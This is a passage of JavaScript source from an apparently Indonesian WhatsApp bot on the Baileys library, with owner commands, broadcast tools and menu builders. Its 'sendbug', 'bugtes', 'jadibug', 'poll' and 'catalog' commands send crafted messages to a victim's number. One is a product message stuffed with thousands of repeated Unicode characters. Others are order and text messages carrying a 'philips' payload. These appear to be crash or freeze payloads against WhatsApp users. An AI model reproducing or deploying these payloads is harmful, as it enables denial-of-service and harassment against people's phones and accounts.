if (!vid) throw 'Video/Audio Tidak Ditemukan'
let { title, description, thumbnail, videoId, durationH, durationS, viewH, publishedTime } = vid
let url = 'https://www.youtube.com/watch?v=' + videoId
let ytLink = `https://yt-downloader.akkun3704.repl.co/?url=${url}&filter=audioonly&quality=highestaudio&contenttype=audio/mpeg`
gans.sendMessage(m.chat, {audio:{url:args[0]}, mimetype:"audio/mp4", m})
}
break

//menu Owner ygy
case 'join': {
if (!isCreator) throw mess.owner
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
m.reply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await gans.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'leave': {
if (!isCreator) throw mess.owner
await gans.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'listpc': {
if (!isCreator) throw mess.owner
let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
for (let i of anu) {
let nama = store.messages[i].array[0].pushName
teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n\n───────────────\n\n`
let buttons = [{ buttonId: 'donasi', buttonText: { displayText: '👑 SEWA' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: '❗Rules' }, type: 1 }]
await gans.sendButtonText(m.chat, buttons, teks, nyoutube, m, {mentions: [i], quoted: fkontak})
}}
break
case 'listgc': {
if (!isCreator) throw mess.owner
let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
for (let i of anu) {
let metadata = await gans.groupMetadata(i)
teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n─────────────────\n\n`
let buttons = [{ buttonId: 'donasi', buttonText: { displayText: '👑 SEWA' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: '❗Rules' }, type: 1 }]
await gans.sendButtonText(m.chat, buttons, teks, nyoutube, m, {mentions: [metadata.owner], quoted: fkontak})
}}
break
case 'public': {
if (!isCreator) throw mess.owner
gans.public = true
m.reply('*Sukses Change To Public Usage*')
}
break
case 'self': {
if (!isCreator) throw mess.owner
gans.public = false
m.reply('*Sukses Change To Self Usage*')
}
break
case 'block': {
if (!isCreator) throw mess.owner
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await gans.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'unblock': {
if (!isCreator) throw mess.owner
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await gans.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'addprem': {
m.reply(`*_Error!_*\n*Fitur Addprem & Delprem Akan Owner Buka Next Update*\n_Minggu Depan :v_`)
}
break
case 'setexif': {
if (!isCreator) throw mess.owner
if (!text) throw `Example : ${prefix + command} packname|author`
global.packname = text.split("|")[0]
global.author = text.split("|")[1]
m.reply(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Author : ${global.author}`)
}
break
case 'bcgc': case 'bcgroup': {
if (!isCreator) throw mess.owner
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await gans.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
let txt = `「 Broadcast Bot 」\n\n${text}`
let buttons = [{ buttonId: 'donasi', buttonText: { displayText: '👑 SEWA' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: '❗Rules' }, type: 1 },{ buttonId: 'owner', buttonText: { displayText: '👤 Owner' }, type: 1 }]
await gans.sendButtonText(i, buttons, txt, nyoutube, m, {quoted: fkontak})
}
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'bc': case 'broadcast': case 'bcall': {
if (!isCreator) throw mess.owner
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let anu = await store.chats.all().map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
for (let yoi of anu) {
await sleep(1500)
let txt = `「 Broadcast Bot 」\n\n${text}`
let buttons = [{ buttonId: 'donasi', buttonText: { displayText: '👑 SEWA' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: '❗Rules' }, type: 1 }]
await gans.sendButtonText(yoi, buttons, txt, nyoutube, m, {quoted: fkontak})
}
m.reply('Sukses Broadcast')
}
break
case 'setppbot': {
if (!isCreator) throw mess.owner
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
let media = await gans.downloadAndSaveMediaMessage(quoted)
await gans.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply(mess.success)
}
break
case 'react': {
if (!isCreator) throw mess.owner
reactionMessage = {
react: {
text: args[0],
key: m.key
}
}
gans.sendMessage(m.chat, reactionMessage)
}
break  
case 'setmenu': {
if (!isCreator) throw mess.owner
let setbot = db.data.settings[botNumber]
if (args[0] === 'templateImage'){
setbot.templateImage = true
setbot.templateVideo = false
setbot.templateGif = false
setbot.templateMsg = false
m.reply(mess.success)
} else if (args[0] === 'templateVideo'){
setbot.templateImage = false
setbot.templateVideo = true
setbot.templateGif = false
setbot.templateMsg = false
m.reply(mess.success)
} else if (args[0] === 'templateGif'){
setbot.templateImage = false
setbot.templateVideo = false
setbot.templateGif = true
setbot.templateMsg = false
m.reply(mess.success)
} else if (args[0] === 'templateMessage'){
setbot.templateImage = false
setbot.templateVideo = false
setbot.templateGif = false
setbot.templateMsg = true
m.reply(mess.success)
} else {
let sections = [
{
title: "CHANGE MENU BOT",
rows: [
{title: "Template Image", rowId: `setmenu templateImage`, description: `Change menu bot to Template Image`},
{title: "Template Video", rowId: `setmenu templateVideo`, description: `Change menu bot to Template Video`},
{title: "Template Gif", rowId: `setmenu templateGif`, description: `Change menu bot to Template Gif`},
{title: "Template Message", rowId: `setmenu templateMessage`, description: `Change menu bot to Template Message`}
]
},
]
gans.sendListMsg(m.chat, `pilih aja *${pushname}* Setmenu nya!`, nyoutube, `*Hello Kak* !`, `Pilih Set Menu`, sections, m)
    }
            }
break

//
case 'sendbug': case 'santet': {
if (!text) throw m.reply(`masukan Nomor Yang Ingin Dikirimkan BuG`)
    let korban = `${text}`
    let nomor = m.sender
            let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let ments = [ownernya, me, ini_mark]
            let kukiw = `*Kak ${pushname} ${ucapanWaktu} Semoga Harimu Menyenangkan*`
                let sections = [
                {
	           title: "⚠︎  ∫ » Pilih Sound Dibawah Kak « ✧",
                rows: [
                {title: "✦  「 BUG 1 」", rowId: `.catalog ${text}`, description: ``},
                {title: "✦  「 BUG 2 」", rowId: `bugtes ${text}`, description: ``},
                {title: "✦  「 BUG 3 」", rowId: `poll ${text}`, description: ``}
	]
  },
]
                gans.sendListMsg(m.chat, kukiw, nyoutube, `*${ucapanWaktu}*`, `Touch Me (⁠≧⁠▽⁠≦⁠)`, sections, ftroli)
            }
            break
case 'bugtes': {
				    if (!text) throw m.reply(`masukan Nomor Yang Ingin Dikirimkan BuG`)
    let korban = `${text}`
    let nomor = m.sender
					const ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const te = ra[Math.floor(Math.random() * ra.length)]
                    gans.sendMessage(korban + '@s.whatsapp.net', { text: `*save ya*` }, { quoted: doc })
                    gans.sendMessage(korban + '@s.whatsapp.net', {text:philips}, {quoted:doc})
                    m.reply('sukses bg defri😁')
                    }
					break
case 'jadibug': {
if (!text) throw m.reply(`contoh :/n ${command} deffri`)
{
a = await gans.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${author}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${philips}`,
"orderTitle": `${philips}`,
"sellerJid": "6283186308195@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted: doc })
gans.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
}
break
case 'poll': {
if (!isCreator) return
if (!text) throw m.reply(`masukan Nomor Yang Ingin Dikirimkan BuG`)
    let korban = `${text}`
    let nomor = m.sender
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "HALO 👋 SAYA BOT HW MODS WA",
"options": [
	{
"optionName": "KATANYA WA KEBAL"
	},
	{
"optionName": "BERANI VOTE GA"
	},
	{
"optionName": "VOTE LAH SEMUA"
	},
	{
"optionName": "KATANYA KEBAL"
	},
	{
"optionName": "SALAM BROTHER BY HW MODS WA"
	}
],
"selectableOptionsCount": 5
	}
}), { userJid: m.chat, quoted: doc })
gans.relayMessage(korban + '@s.whatsapp.net', pollCreation.message, { messageId: pollCreation.key.id })
m.reply('sukses sendbug')
}
break
case 'catalog': {
if (!isCreator) return
if (!text) throw m.reply(`masukan Nomor Yang Ingin Dikirimkan BuG`)
    let korban = `${text}`
    let nomor = m.sender
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/image/fake.jpg') }, { upload: gans.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `[⫹⫺ - 㑒 ❝𝗛𝗪 - 𝗠𝗢𝗗𝗦❞ - ★ 𝗪𝗔 ★ ϟ〽️]\ 🦇̣̣̣̣̣̣̣̣⃟   ...𝛀..𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦`,
"description": `© ${author}`,
"currencyCode": "IDR",
"footerText": `${titlebot}`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `${titlebot}`,
"url": "wa.me/628887816980"
},
"businessOwnerJid": "628887816980@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc })
gans.relayMessage(korban + '@s.whatsapp.net', catalog.message, { messageId: catalog.key.id })
gans.sendMessage(korban + '@s.whatsapp.net', {text:philips}, {quoted:doc})
m.reply('sukses')
}
break

//Khusus Untuk Menu
case 'menu': {
 let ownernya = ownernomer + '@s.whatsapp.net'
let me = m.sender
let jawab = `*Hai Kak ${pushname} ${ucapanWaktu} Semoga Hari Mu Menyenangkan*

╔━═━⊱ *「 USER INFO」* ━═━⬣
┃ *ダ Nama: ${pushname}*
┃ *ダ Limit: ${isCreator ? 'Unlimited 👑' : `${db.data.users[m.sender].limit}`}*
┃ *ダ Tag: @${sender.split('@')[0]}*
┃ *ダ User: ${isPremium? 'Premium 👑' : 'Gratisan 🗿'}*
┃ *ダ Number : @${me.split('@')[0]}*
┃ *ダ Status : ${isCreator? "Owner 👑️":"User ⚔️"}*
┗━━━━━━━━━━━━━━⬣

╔━═━⊱ *「 BOT INFO」* ━═━⬣
┃ *冬 Nama Bot: ${botname}*
┃ *冬 Owner: @${ownernya.split('@')[0]}*
┃ *冬 Powered  : @${ini_mark.split('@')[0]}*
┃ *冬 Email: botdeff4@gmail.com*
┃ *冬 Lib : Baileys Multi Device*
┃ *冬 Prefix : Multi Prefix*
┃ *冬 Baterai : 100% ga dicas*
┃ *冬 Platfrom : Linux*
┃ *冬 Runtime : ${runtime(process.uptime())}*
┃ *冬 Calender : ${hariini}*
┃ *冬 Language : Javascript*
┃ *冬 Ram : ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}*
┗━═━⊱ *「 ${botname} 」* ━═━⬣`
let ments = [ownernya, me, ini_mark]
let buttons = [{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: '❗Rules' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
let buttonMessage = {
  document: fs.readFileSync('./media/doc/fake.pptx'),
  fileName : akulaku + (` | Halo ${pushname}`),
  mimetype: `${filsk}`,
  fileLength: jumhal,
  pageCount: jumlha,
  caption: jawab,
  footer: nyoutube,
  buttons: buttons,
  mentions: ments,
  headerType: 4,
  contextInfo:{externalAdReply:{
  title: titlebot,
  body: 'Subscribe My YouTube', 
  showAdAttribution: true,
  thumbnail: thumb,
  mediaType: 2,
  mediaUrl: myytv,
  sourceUrl: myyt
  }}
  }
  gans.sendMessage(m.chat, buttonMessage, {quoted: ftroli})
  }
 break
case 'simplemenu': case 'list': case 'help': {
let ownernya = ownernomer + '@s.whatsapp.net'
let me = m.sender
let ments = [ownernya, me, ini_mark]
let kukiw = `*Kak ${pushname} ${ucapanWaktu} Semoga Harimu Menyenangkan*`
let sections = [
{
title: ' ∫ » Sewa Bot? –––––––·•',
rows: [
{title: "〽️ • Sewa", rowId: `donasi`},
{title: "📴 • Owner", rowId: `owner`}
	            ]
    },{
    title: "⚠︎  ∫ » PILIH MENU BOT « ✧",
    rows: [
{title: "✦  「 Group 」", rowId: `mgroup`},
{title: "✦  「 Webzone 」", rowId: `mwebzone`},
{title: "✦  「 Downloader 」", rowId: `mdownloader`},
{title: "✦  「 Search 」", rowId: `msearch`},
{title: "✦  「 Random 」", rowId: `mrandom`},
{title: "✦  「 Text Pro 」", rowId: `mtextpro`},
{title: "✦  「 Photo Oxy 」", rowId: `mphotooxy`},
{title: "✦  「 Ephoto 」", rowId: `mephoto`},
{title: "✦  「 Fun 」", rowId: `mfun`},
{title: "✦  「 Primbon 」", rowId: `mprimbon`},
{title: "✦  「 Convert 」", rowId: `mconvert`},
{title: "✦  「 Main 」", rowId: `mmain`},
{title: "✦  「 Database 」", rowId: `mdatabase`},
{title: "✦  「 Anonymous 」", rowId: `manonymous`},
{title: "✦  「 Islamic 」", rowId: `mislamic`},
{title: "✦  「 Voice 」", rowId: `mvoice`},
{title: "✦  「 Owner 」", rowId: `mowner`}
]
},{
title: ' ∫ » SUPPORT ME –––––––·•',
rows: [
{title: "🎟 • Donasi", rowId: `donasi`},
{title: "🔴 • Subscribe", rowId: `subsyt`},
{title: "📚 • Github", rowId: `sc`}
]
},
]
gans.sendListMsg(m.chat, kukiw, nyoutube, `*${ucapanWaktu}*`, `Touch Me (⁠≧⁠▽⁠≦⁠)`, sections, ftroli)
}
break
case 'mgroup': {
goup = `╭──❍ *Group Menu*
│
│⭔ ${prefix}linkgroup
│⭔ ${prefix}ephemeral [option]
│⭔ ${prefix}setppgc [image]
│⭔ ${prefix}setname [text]
│⭔ ${prefix}setdesc [text]
│⭔ ${prefix}group [option]
│⭔ ${prefix}editinfo [option]
│⭔ ${prefix}add @user
│⭔ ${prefix}kick @user
│⭔ ${prefix}hidetag [text]
│⭔ ${prefix}tagall [text]
│⭔ ${prefix}antilink [on/off]
│⭔ ${prefix}mute [on/off]
│⭔ ${prefix}promote @user
│⭔ ${prefix}demote @user
│⭔ ${prefix}vote [text]
│⭔ ${prefix}devote
│⭔ ${prefix}upvote
│⭔ ${prefix}cekvote
│⭔ ${prefix}hapusvote
│
╰─────❍`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
gans.sendMessage(m.chat, { caption: `${goup}`, location: { jpegThumbnail: await reSize(faall, 300, 200)}, buttons: buttons, nyoutube, quoted: ftroli})
}
break
case 'mwebzone': {
wbzone = `╭──❍ *Webzone Menu*
│
│⭔ ${prefix}playstore
│⭔ ${prefix}gsmarena
│⭔ ${prefix}jadwalbioskop
│⭔ ${prefix}nowplayingbioskop
│⭔ ${prefix}aminio
│⭔ ${prefix}wattpad
│⭔ ${prefix}webtoons
│⭔ ${prefix}drakor
│
╰────❍`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
gans.sendMessage(m.chat, { caption: `${wbzone}`, location: { jpegThumbnail: await reSize(faall, 300, 200)}, buttons: buttons, nyoutube, quoted: ftroli})
}
break
case 'mdownloader': {
dwnloader = `╭──❍ *Downloader Menu*
│
│⭔ ${prefix}tiktoknowm [url]
│⭔ ${prefix}tiktokwm [url]
│⭔ ${prefix}tiktokmp3 [url]
│⭔ ${prefix}instagram [url]
│⭔ ${prefix}twitter [url]
│⭔ ${prefix}twittermp3 [url]
│⭔ ${prefix}facebook [url]
│⭔ ${prefix}pinterestdl [url]
│⭔ ${prefix}ytmp3 [url]
│⭔ ${prefix}ytmp4 [url]
│⭔ ${prefix}getmusic [query]
│⭔ ${prefix}getvideo [query]
│⭔ ${prefix}umma [url]
│⭔ ${prefix}joox [query]
│⭔ ${prefix}soundcloud [url]
│
╰────❍`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
gans.sendMessage(m.chat, { caption: `${dwnloader}`, location: { jpegThumbnail: await reSize(faall, 300, 200)}, buttons: buttons, nyoutube, quoted: ftroli})
}
break
case 'msearch': {
sarch = `╭──❍ *Search Menu*
│
│⭔ ${prefix}play [query]
│⭔ ${prefix}yts [query]
│⭔ ${prefix}google [query]
│⭔ ${prefix}gimage [query]
│⭔ ${prefix}pinterest [query]
│⭔ ${prefix}wallpaper [query]
│⭔ ${prefix}wikimedia [query]
│⭔ ${prefix}ytsearch [query]
│⭔ ${prefix}ringtone [query]
│⭔ ${prefix}stalk [option] [query]
│
╰────❍`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
gans.sendMessage(m.chat, { caption: `${dwnloader}`, location: { jpegThumbnail: await reSize(faall, 300, 200)}, buttons: buttons, nyoutube, quoted: ftroli})
}
break
case 'mrandom': {
rndom = `╭──❍ *Random Menu*
│
│⭔ ${prefix}gbtku
│⭔ ${prefix}coffe
│⭔ ${prefix}quotesanime
│⭔ ${prefix}motivasi
│⭔ ${prefix}dilanquote
│⭔ ${prefix}bucinquote
│⭔ ${prefix}katasenja
│⭔ ${prefix}puisi
│⭔ ${prefix}couple
│⭔ ${prefix}anime
│⭔ ${prefix}waifu
│
╰────❍`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
gans.sendMessage(m.chat, { caption: `${dwnloader}`, location: { jpegThumbnail: await reSize(faall, 300, 200)}, buttons: buttons, nyoutube, quoted: ftroli})
}
break
case 'mtextpro': {
txtpro = `╭──❍ *Text Pro Menu*
│
│⭔ ${prefix}3dchristmas
│⭔ ${prefix}3ddeepsea
│⭔ ${prefix}americanflag
│⭔ ${prefix}3dscifi
│⭔ ${prefix}3drainbow
│⭔ ${prefix}3dwaterpipe
│⭔ ${prefix}halloweenskeleton
│⭔ ${prefix}sketch
│⭔ ${prefix}bluecircuit
│⭔ ${prefix}space
│⭔ ${prefix}metallic
│⭔ ${prefix}fiction
│⭔ ${prefix}greenhorror
│⭔ ${prefix}transformer
│⭔ ${prefix}berry
│⭔ ${prefix}thunder
│⭔ ${prefix}magma
│⭔ ${prefix}3dcrackedstone
│⭔ ${prefix}3dneonlight
│⭔ ${prefix}impressiveglitch
│⭔ ${prefix}naturalleaves
│⭔ ${prefix}fireworksparkle
│⭔ ${prefix}matrix
│⭔ ${prefix}dropwater
│⭔ ${prefix}harrypotter
│⭔ ${prefix}foggywindow
│⭔ ${prefix}neondevils
│⭔ ${prefix}christmasholiday
│⭔ ${prefix}3dgradient
│⭔ ${prefix}blackpink
│⭔ ${prefix}gluetext
│
╰────❍`
